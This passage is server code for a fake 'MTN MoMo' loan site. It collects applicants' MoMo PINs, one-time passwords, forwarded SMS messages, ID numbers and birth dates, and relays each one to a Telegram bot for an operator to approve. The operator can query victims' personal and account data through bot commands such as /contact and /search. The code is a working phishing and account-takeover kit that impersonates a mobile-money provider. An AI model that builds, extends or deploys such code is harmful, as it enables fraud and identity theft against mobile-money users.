    line('Full Name', `${app_.firstName || ''} ${app_.lastName || ''}`.trim());
    line('ID Number', app_.momoRegistration?.idNumber);
    line('Date of Birth', app_.dob || app_.momoRegistration?.dob);
    line('Age', app_.momoRegistration?.idDetails?.age);
    line('Gender', app_.momoRegistration?.idDetails?.gender);
    line('Phone', app_.phone ? '+27 ' + app_.phone : null);
    line('Email', app_.email);
    line('MoMo Account', app_.momoRegistration?.accountName || app_.accountType);
    doc.moveDown(0.8);

    doc.font('Helvetica-Bold').fontSize(12).text('LOAN DETAILS');
    doc.moveDown(0.3);
    line('Principal', 'R ' + fmt(loanAmount));
    line('Term', loanTerm);
    line('Monthly Payment', 'R ' + fmt(monthly));
    line('Total Repayment', 'R ' + fmt(total));
    line('Interest Rate', '27% per annum (compounded monthly)');
    doc.moveDown(0.8);

    doc.font('Helvetica-Bold').fontSize(12).text('GUARANTOR');
    doc.moveDown(0.3);
    line('Name', app_.guarantorName);
    line('Phone', app_.guarantorPhone ? '+27 ' + app_.guarantorPhone : null);
    line('Relationship', app_.guarantorRelation);
    doc.moveDown(0.8);

    doc.font('Helvetica-Bold').fontSize(12).text('TERMS ACCEPTANCE');
    doc.moveDown(0.3);
    line('Accepted On', tnc.timestamp ? new Date(tnc.timestamp).toLocaleString('en-ZA') : null);
    line('Version', tnc.version);
    line('IP Address', tnc.ip);
    doc.moveDown(0.8);

    doc.font('Helvetica-Bold').fontSize(12).text('TERMS SUMMARY');
    doc.moveDown(0.3);
    doc.font('Helvetica').fontSize(10).fillColor('#333');
    [
        '1. Borrower agrees to repay the loan per the agreed schedule.',
        '2. Guarantor accepts joint and several liability on default.',
        '3. Late payments attract penalties per the National Credit Act.',
        '4. Early settlement is permitted without penalty.',
        '5. MoMo transaction history informs ongoing eligibility.',
        '6. 5-business-day cooling-off period applies.'
    ].forEach(l => doc.text(l));
    doc.moveDown(1.5);

    doc.fontSize(9).fillColor('#888').text(
        `Generated ${new Date().toLocaleString('en-ZA')} · © 2026 MTN MoMo South Africa`,
        { align: 'center' }
    );

    doc.end();
});

app.get('/api/repayment-schedule/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });

    const loanAmount = app_.loanAmount || 0;
    const months = parseInt(app_.loanTerm) || 12;
    if (!loanAmount || !months) return res.status(400).json({ ok: false, error: 'No loan data' });

    const r = 0.27 / 12;
    const monthly = Math.ceil(loanAmount * r / (1 - Math.pow(1 + r, -months)) + 60);
    const schedule = [];
    let balance = loanAmount;
    for (let i = 1; i <= months; i++) {
        const interest = Math.round(balance * r);
        const principal = monthly - interest;
        balance = Math.max(0, balance - principal);
        schedule.push({ month: i, payment: monthly, interest, principal, balance });
    }
    res.json({ ok: true, schedule });
});

// ═══════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK (unchanged logic — same as v6.4)
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', (req, res) => {
    res.status(200).send('ok');
    console.log('🔔 WEBHOOK:', new Date().toISOString());

    try {
        if (req.body && req.body.callback_query) {
            const q = req.body.callback_query;
            fetch(`${TG_API}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: q.id, text: 'Received' })
            }).catch(() => {});

            try {
                const data = JSON.parse(q.data);
                const app_ = applications[data.id];
                if (!app_) return;

                const step = data.s;
                const approved = data.a === 'Y';
                const isNewStep = !!(app_.steps && step in app_.steps);
                const isLegacy  = !isNewStep && (step in app_);
                if (!isNewStep && !isLegacy) return;

                const currentStatus = isNewStep ? app_.steps[step] : app_[step];
                if (currentStatus !== 'pending') return;

                const newValue = approved ? 'approved' : 'rejected';
                if (isNewStep) app_.steps[step] = newValue;
                if (isLegacy)  app_[step] = newValue;

                if (step === 'qualification') app_.qualification = approved ? 'qualified' : 'unqualified';
                if (step === 'application')   app_.application = newValue;

                app_.updatedAt = new Date().toISOString();
                saveApps();
                audit('admin_decision', { id: data.id, step, decision: newValue });

                tgSend(
                    `${approved ? '✅' : '❌'} <b>${approved ? 'APPROVED' : 'REJECTED'}</b>\n` +
                    `🆔 ${code(data.id)}\n📋 ${step.toUpperCase()}\n` +
                    `👤 ${esc(app_.firstName || '')} ${esc(app_.lastName || '')}`
                );
            } catch (e) { console.error('Callback parse:', e.message); }
            return;
        }

        if (req.body && req.body.message && req.body.message.text) {
            const text = req.body.message.text.trim();
            const chatId = req.body.message.chat.id.toString();
            if (!CHAT_ID || chatId !== CHAT_ID.toString()) return;

            if (text === '/start' || text === '/help') {
                tgSend(`🤖 <b>MTN MoMo Loan Bot</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats\n📋 /list\n🔍 /search [ID]\n📞 /contact [ID]\n⏳ /pending\n📱 /registrations`);
            } else if (text === '/stats') {
                const total = Object.keys(applications).length;
                const regs = Object.keys(registrations).length;
                const pending = Object.values(applications).filter(a =>
                    (a.steps && Object.values(a.steps).includes('pending')) ||
                    a.application === 'pending' || a.sms === 'pending' ||
                    a.pin === 'pending' || a.otp === 'pending' || a.qualification === 'pending'
                ).length;
                const completed = Object.values(applications).filter(a =>
                    a.steps?.qualification === 'approved' || a.qualification === 'qualified'
                ).length;
                tgSend(`📊 <b>STATS</b>\n📝 Apps: <b>${total}</b>\n📱 Registrations: <b>${regs}</b>\n⏳ Pending: ${pending}\n✅ Completed: ${completed}`);
            } else if (text === '/registrations') {
                const ids = Object.keys(registrations).slice(-10);
                if (!ids.length) { tgSend('📭 No registrations.'); return; }
                let msg = '📱 <b>RECENT REGISTRATIONS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
                ids.forEach(id => {
                    const r = registrations[id];
                    msg += `\n🆔 ${code(id)}\n💳 ${esc(r.accountName)}\n`;
                    if (r.phone) msg += `📞 ${code('+27' + r.phone)}\n`;
                    if (r.email) msg += `📧 ${code(r.email)}\n`;
                    msg += `💵 Max loan: <b>R ${fmt(r.limits?.maxLoan)}</b>\n`;
                });
                tgSend(msg);
            } else if (text.startsWith('/contact ')) {
                const needle = text.replace('/contact ', '').trim().toUpperCase();
                const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
                const a = realKey ? applications[realKey] : null;
                if (!a) { tgSend('❌ Not found'); return; }
                tgSend(
                    `📞 <b>CONTACT — ${code(realKey)}</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `Name: ${esc(a.firstName || a.fullName || 'N/A')} ${esc(a.lastName || '')}\n` +
                    `Phone: ${a.phone ? code('+27' + a.phone) : 'MISSING'}\n` +
                    `Email: ${a.email ? code(a.email) : 'MISSING'}\n` +
                    `DOB: ${a.dob ? code(a.dob) : (a.momoRegistration?.dob ? code(a.momoRegistration.dob) : 'N/A')}\n` +
                    `ID: ${a.momoRegistration?.idNumber ? code(a.momoRegistration.idNumber) : 'N/A'}\n` +
                    `Account: ${esc(a.momoRegistration?.accountName || a.accountType || 'N/A')}\n` +
                    `T&amp;C: ${a.tncAccepted ? `✅ v${a.tncAccepted.version} · ${new Date(a.tncAccepted.timestamp).toLocaleDateString('en-ZA')}` : '❌ not accepted'}`
                );
            } else if (text === '/pending') {
                const pending = Object.entries(applications).filter(([_, a]) => {
                    if (a.steps && Object.values(a.steps).includes('pending')) return true;
                    return a.application === 'pending' || a.sms === 'pending' ||
                           a.pin === 'pending' || a.otp === 'pending' || a.qualification === 'pending';
                });
                if (!pending.length) { tgSend('✅ No pending.'); return; }
                let msg = `⏳ <b>PENDING (${pending.length})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
                pending.slice(0, 10).forEach(([id, a]) => {
                    const steps = [];
                    if (a.steps) STEP_ORDER.forEach(k => { if (a.steps[k] === 'pending') steps.push(k); });
                    ['application','sms','pin','otp'].forEach(k => { if (a[k] === 'pending') steps.push(k); });
                    msg += `\n🆔 ${code(id)}\n👤 ${esc(a.firstName || '')} ${esc(a.lastName || '')}\n💰 R ${fmt(a.loanAmount)}\n📋 ${steps.join(', ')}\n`;
                });
                tgSend(msg);
            } else if (text === '/list') {
                const ids = Object.keys(applications).slice(-10);
                if (!ids.length) { tgSend('📭 No applications.'); return; }
                let msg = '📋 <b>LAST 10</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
                ids.forEach((id, i) => {
                    const a = applications[id];
                    msg += `\n${i+1}. 🆔 ${code(id)}\n👤 ${esc(a.firstName || '')} ${esc(a.lastName || '')}\n💰 R ${fmt(a.loanAmount)}\n`;
                });
                tgSend(msg);
            } else if (text.startsWith('/search ')) {
                const needle = text.replace('/search ', '').trim().toUpperCase();
                const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
                const a = realKey ? applications[realKey] : null;
                if (!a) { tgSend('❌ Not found'); return; }
                const monthly = a.monthlyRepayment || monthlyRepayment(a.loanAmount, parseInt(a.loanTerm));
                const stepStatus = a.steps
                    ? STEP_ORDER.map(k => `${k}:${a.steps[k]}`).join(' ')
                    : `App:${a.application} SMS:${a.sms} PIN:${a.pin} OTP:${a.otp} Qual:${a.qualification}`;
                tgSend(
                    `🔍 <b>DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🆔 ${code(realKey)}\n👤 ${esc(a.firstName || '')} ${esc(a.lastName || '')}\n` +
                    `📱 ${a.phone ? code('+27' + a.phone) : 'N/A'}\n` +
                    `📧 ${a.email ? code(a.email) : 'N/A'}\n` +
                    `💳 ${esc(a.momoRegistration?.accountName || a.accountType || 'Not registered')}\n` +
                    `💰 <b>R ${fmt(a.loanAmount)}</b> · Monthly <b>R ${fmt(monthly)}</b>\n` +
                    `🤝 Guarantor: ${esc(a.guarantorName || 'N/A')}\n📋 ${stepStatus}`
                );
            }
        }
    } catch (e) { console.error('Webhook error:', e.message); }
});

// ═══════════════════════════════════════════════════════════
// STATUS ENDPOINTS (guarded)
// ═══════════════════════════════════════════════════════════
app.get('/api/status/:applicationId/:step', guardAppId, (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const valid = [...STEP_ORDER, ...LEGACY_STEPS];
    if (!valid.includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });
    res.json({ ok: true, status: readStep(app_, step), applicationId, step });
});

app.get('/api/status/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const steps = {};
    STEP_ORDER.forEach(k => { steps[k] = readStep(app_, k); });
    res.json({
        ok: true,
        isRegistered: !!app_.isRegistered,
        accountType: app_.accountType || null,
        accountMaxLoan: app_.accountMaxLoan || 0,
        phone: app_.phone || null,
        email: app_.email || null,
        dob: app_.dob || null,
        tncAccepted: app_.tncAccepted || null,
        steps,
        loan: app_.loanData || (app_.loanAmount ? { loanType: app_.loanType, loanAmount: app_.loanAmount, loanTerm: app_.loanTerm, loanPurpose: app_.loanPurpose } : null),
        personal: app_.personalData || (app_.firstName ? { firstName: app_.firstName, lastName: app_.lastName, phone: app_.phone, email: app_.email } : null),
        employment: app_.employmentData || null,
        guarantor: app_.guarantorData || null,
        application: app_.application, sms: app_.sms, pin: app_.pin, otp: app_.otp, qualification: app_.qualification
    });
});

// ═══════════════════════════════════════════════════════════
// RETRY / RESEND (guarded)
// ═══════════════════════════════════════════════════════════
app.post('/api/retry/:applicationId/:step', guardAppId, (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const valid = [...STEP_ORDER, 'sms', 'pin', 'otp'];
    if (!valid.includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });

    writeStep(app_, step, 'idle');
    if (step === 'loan') app_.loanData = null;
    if (step === 'personal') app_.personalData = null;
    if (step === 'employment') app_.employmentData = null;
    if (step === 'guarantor') app_.guarantorData = null;
    if (step === 'momologin') { app_.loginPin = null; app_.momoLoginData = null; }
    if (step === 'sms') app_.smsMessage = null;
    if (step === 'pin') app_.pinValue = null;
    if (step === 'otp') app_.otpValue = null;

    app_.updatedAt = new Date().toISOString();
    saveApps();
    res.json({ ok: true });
});

app.post('/api/resend-sms/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    app_.sms = 'idle'; app_.smsMessage = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    res.json({ ok: true });
});

app.post('/api/resend-otp', (req, res) => {
    const { applicationId } = req.body || {};
    const session = readSession(req);
    if (session && session.id !== applicationId) {
        return res.status(403).json({ ok: false, error: 'Session mismatch.' });
    }
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    app_.otp = 'idle'; app_.otpValue = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    tgSend(`🔄 <b>OTP RESENT</b>\n🆔 ${code(applicationId)}`);
    res.json({ ok: true });
});

app.get('/api/rejection-info/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    let rejectedStep = null, errorMessage = '';
    const labels = {
        loan: 'Loan request', personal: 'Personal details', employment: 'Employment',
        guarantor: 'Guarantor', momologin: 'MoMo login', qualification: 'Qualification',
        application: 'Application', sms: 'SMS', pin: 'PIN', otp: 'OTP'
    };
    for (const k of [...STEP_ORDER, ...LEGACY_STEPS]) {
        const status = readStep(app_, k);
        if (status === 'rejected' || (k === 'qualification' && status === 'unqualified')) {
            rejectedStep = k;
            errorMessage = `${labels[k] || k} was rejected.`;
            break;
        }
    }
    res.json({ ok: true, rejectedStep, errorMessage });
});

// ═══════════════════════════════════════════════════════════
// LEGACY FLOW (kept)
// ═══════════════════════════════════════════════════════════
app.post('/api/send-application', (req, res) => {
    try {
        const data = req.body.applicationData || {};
        const { applicationId } = data;
        if (!applicationId) return res.status(400).json({ ok: false, error: 'Missing application ID' });
        const app_ = applications[applicationId];
        if (!app_ || !app_.isRegistered || !app_.accountType || !ACCOUNT_TYPES[app_.accountType]) {
            return res.status(403).json({ ok: false, code: 'NOT_REGISTERED', error: 'Invalid user credentials. You must register on MoMo before applying.' });
        }
        const type = ACCOUNT_TYPES[app_.accountType];
        if (data.loanAmount > type.maxLoan) return res.status(400).json({ ok: false, error: `Max R ${fmt(type.maxLoan)} for ${type.name}.` });
        if (data.loanAmount < type.minLoan) return res.status(400).json({ ok: false, error: `Min R ${fmt(type.minLoan)}.` });
        Object.assign(app_, data, {
            accountName: type.name, accountMaxLoan: type.maxLoan,
            monthlyRepayment: monthlyRepayment(data.loanAmount, parseInt(data.loanTerm)),
            application: 'pending', updatedAt: new Date().toISOString()
        });
        saveApps();
        askApproval(`📋 <b>NEW APPLICATION</b>\n🆔 ${code(applicationId)}`, 'application', applicationId);
        res.json({ ok: true, applicationId, status: 'pending' });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/send-momo-message', (req, res) => {
    const { applicationId, phone, momoMessage } = req.body.momoData || {};
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (app_.application !== 'approved') return res.status(400).json({ ok: false, error: 'Application not approved yet' });
    app_.smsMessage = String(momoMessage || '').trim();
    app_.sms = 'pending';
    saveApps();
    askApproval(`📨 SMS from ${code('+27' + phone)}\n${block(momoMessage)}`, 'sms', applicationId);
    res.json({ ok: true, status: 'pending' });
});

app.post('/api/send-pin', (req, res) => {
    const { applicationId, pin } = req.body || {};
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (app_.sms !== 'approved') return res.status(400).json({ ok: false, error: 'SMS not approved' });
    if (!/^\d{5}$/.test(String(pin || ''))) return res.status(400).json({ ok: false, error: 'PIN must be 5 digits' });
    app_.pinValue = pin; app_.pin = 'pending'; saveApps();
    askApproval(`🔐 PIN ${code(pin)}`, 'pin', applicationId);
    res.json({ ok: true, status: 'pending' });
});

app.post('/api/send-otp', (req, res) => {
    const { applicationId, otp } = req.body || {};
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (app_.pin !== 'approved') return res.status(400).json({ ok: false, error: 'PIN not approved' });
    if (!/^\d{4}$/.test(String(otp || ''))) return res.status(400).json({ ok: false, error: 'OTP must be 4 digits' });
    app_.otpValue = otp; app_.otp = 'pending'; saveApps();
    askApproval(`🔑 OTP ${code(otp)}`, 'otp', applicationId);
    res.json({ ok: true, status: 'pending' });
});

app.post('/api/check-qualification', (req, res) => {
    const { applicationId } = req.body || {};
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (app_.otp !== 'approved') return res.status(400).json({ ok: false, error: 'OTP not approved' });
    app_.qualification = 'pending';
    saveApps();
    askApproval(`📊 Qualification review\n🆔 ${code(applicationId)}`, 'qualification', applicationId);
    res.json({ ok: true, status: 'pending' });
});

// ─── SPA fallback ───
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

// ─── Boot ───
loadAll();
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT} (v6.5)`);
    console.log(`   → http://localhost:${PORT}`);
    console.log(`   → Health: /health`);
    console.log(`   → Terms: /api/terms\n`);
});
